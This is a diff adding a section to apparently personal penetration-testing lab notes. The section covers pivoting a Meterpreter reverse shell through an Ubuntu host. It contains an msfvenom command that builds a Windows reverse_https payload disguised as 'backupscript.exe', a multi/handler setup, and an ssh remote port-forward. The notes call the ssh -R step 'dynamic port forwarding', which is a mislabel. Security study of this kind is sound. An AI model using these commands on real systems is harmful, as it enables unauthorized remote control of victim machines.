@@ -172,6 +172,45 @@ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 - What if we want to gain a reverse shell on the internal victim server.The windows host can only communicate to hosts within `172.16.5.0/23` network.If we start a Metasploit listener on our attack host and try to get a reverse shell, we won't be able to get a direct connection here because the Windows server doesn't know how to route traffic leaving its network (172.16.5.0/23) to reach the 10.129.x.x (the Academy Lab network).
 - In this case,we might want to find a pivot host,which is a common connection point between our attack host and the Windows server.In our case, our pivot host would be the Ubuntu server since it can connect to both: our attack host and the Windows target. To gain a Meterpreter shell on Windows, we will create a Meterpreter HTTPS payload using msfvenom, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (172.16.5.129). We will use the port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, where our Metasploit listener is running.
 
+- Creating a msfvenom payload-:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
+```
+![image](https://github.com/user-attachments/assets/09caec8d-8f58-4ae9-96d0-31eb17c30d6d)
+
+- Configure multi handler
+
+```msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost 0.0.0.0
+set lport 8000
+run
+```
+![image](https://github.com/user-attachments/assets/988bcee2-ae20-43b0-92f1-a5e25e299ebe)
+
+- Transfer payload to pivot host with scp-:
+
+```ssh
+scp filename ubuntu@host:~/
+```
+
+![image](https://github.com/user-attachments/assets/ef9a0e0d-a6d3-4a82-8a21-baf3e600c92f)
+
+- Start a python web server on the Internal Pivost Host-:
+
+- Downloading the file on the victim windows server-:
+
+![image](https://github.com/user-attachments/assets/ee3b400c-f5c8-4a85-8d4b-02ff633e18ad)
+
+- Dynamic port forwarding Syntax-:
+
+```bash
+ssh -R <InternalIPofPivotHost>:[listening port on internal host]:0.0.0.0:[target-Attacker'sport] ubuntu@<ipAddressofTarget> -vN
+```
+- 
+
 
 
 
